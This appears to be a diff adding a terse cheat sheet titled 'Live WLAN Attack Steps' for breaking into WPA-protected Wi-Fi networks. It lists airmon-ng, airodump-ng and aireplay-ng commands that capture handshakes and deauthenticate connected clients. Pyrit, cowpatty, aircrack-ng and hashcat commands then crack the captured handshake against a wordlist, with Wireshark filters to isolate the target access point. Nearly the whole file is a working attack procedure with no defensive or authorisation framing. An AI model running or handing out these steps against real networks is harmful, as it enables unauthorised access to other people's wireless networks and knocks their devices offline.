@@ -1,0 +1,53 @@
+****Live WLAN Attack Steps****
+
+1. airmon-ng
+
+2. airmon-ng wlanX (wireless card)
+
+3. airodump-ng --bssid "AP MAC" channel X --gpsd -w "file for writing pcap to" mon0 (ensure that GPSD is enabled and you have an ext gps dongle)
+
+4. aireplay-ng --deauth 1 -a "AP MAC" -c "Client MAC" --ignore-negative-one mon0
+
+5. aircrack-ng "X".pcap -w /directory/name of wordlist
+
+****PCAP crack****
+
+
+1. Wireshark: Find applicable ESSID aka AP Name and ID BSSID
+
+2. Wireshark: Filter - wlan.sa == BSSID | wlan.da == BSSID
+
+3. Wireshark Export (Displayed Packets) > Save as "Arbitrary Name"
+
+4. Find good Handshakes: pyrit -r "X.pcap" analyze
+
+5. Strip handshakes from pcap: pyrit -r "X.pcap" -o "Xstrip.pcap" strip
+
+6. Crack stripped pcap: pyrit -r "Xstrip.pcap" -i "dictionary file" -b "BSSID" attack_passthrough 
+
+
+***Ensure you are in the current directory that the .cap files and wordlist reside in***
+
+*
+7. Copy file from/to directory = cp /directory path "filename" /directorypath/picture.jpg
+*
+8. Copy multi files from/to directory = cp /directory path "*.type" /directorypath/*.type
+
+*AP Sort = pyrit -r ".cap" analyze | grep AccessPoint | cut -d \' -f2 | sort
+
+*WPA-PSK Dict Attack = cowpatty -r ".cap" -f "wordlist" -s "ESSID"
+
+*Convert .cap > .hccap = aircrack-ng -J "arb filename for hccap" ".cap"
+
+*Hashcat = hashcat -m 2500 ".hccap" "wordlist"
+
+
+
+Wireshark Filters
+ - wlan_mgt.ssid == ESSID
+ - wlan.bssid == BSSID
+ - wlan.sa == BSSID
+ - wlan.da == BSSID
+
+
+
